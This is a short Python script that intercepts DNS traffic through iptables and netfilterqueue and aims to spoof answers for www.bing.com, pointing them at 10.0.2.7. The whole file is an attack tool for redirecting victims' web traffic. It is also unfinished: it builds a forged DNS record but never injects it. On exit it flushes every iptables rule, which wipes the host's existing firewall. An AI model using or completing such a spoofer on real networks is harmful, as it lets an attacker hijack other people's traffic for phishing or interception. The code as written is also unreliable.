#!/usr/bin/env python
import netfilterqueue
import subprocess
import scapy.all as scapy

def proccess_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if 'www.bing.com' in qname:
            print("[+] Spoofing target: {}".format(qname))
            answer = scapy.DNSRR(
                rrname=qname,
                rdata="10.0.2.7"
            )
    packet.accept()

subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)

try:
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, proccess_packet)
        queue.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
    print("\nStopped.. IP Tables Flushed")